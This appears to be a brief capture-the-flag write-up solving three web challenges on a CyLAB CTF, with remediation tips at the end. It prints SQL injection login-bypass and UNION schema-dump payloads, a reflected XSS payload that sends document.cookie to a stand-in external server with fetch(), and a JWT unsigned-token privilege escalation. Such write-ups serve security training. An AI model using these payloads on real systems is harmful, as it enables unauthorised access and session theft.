---
title: "CyLAB CTF: Web Exploitation Challenge"
description: "Solving web exploitation challenges from CyLAB CTF including SQL injection, XSS, and authentication bypass."
date: 2026-07-25
category: "CyLAB"
tags: ["cylab", "web", "sql-injection", "xss", "authentication-bypass"]
platform: "CyLAB CTF"
difficulty: "Medium"
image: "/images/htb-cypher/htb1.webp"
---

# Challenge 1: SQL Injection

## Reconnaissance

Found a login form vulnerable to SQL injection:

```bash
curl "http://ctf.cylab.example/login?username=admin'--&password=test"
```

## Exploitation

Bypassed authentication:

```sql
' OR '1'='1' --
```

Extracted database contents:

```sql
' UNION SELECT table_name, NULL FROM information_schema.tables--
```

## Challenge 2: XSS

Found reflected XSS in the search parameter:

```html
<script>fetch('https://your-server.com/?c='+document.cookie)</script>
```

## Challenge 3: Authentication Bypass

Manipulated JWT token to escalate privileges:

```bash
# Decoded JWT
echo "eyJ0eXAi..." | base64 -d | jq .

# Modified role from user to admin
# Re-encoded with no signature
```

## Flags

```
CyLAB{******************************}
```

## Remediation

- Use parameterized queries
- Implement proper input sanitization
- Validate JWT signatures server-side
- Use HttpOnly and Secure flags on cookies
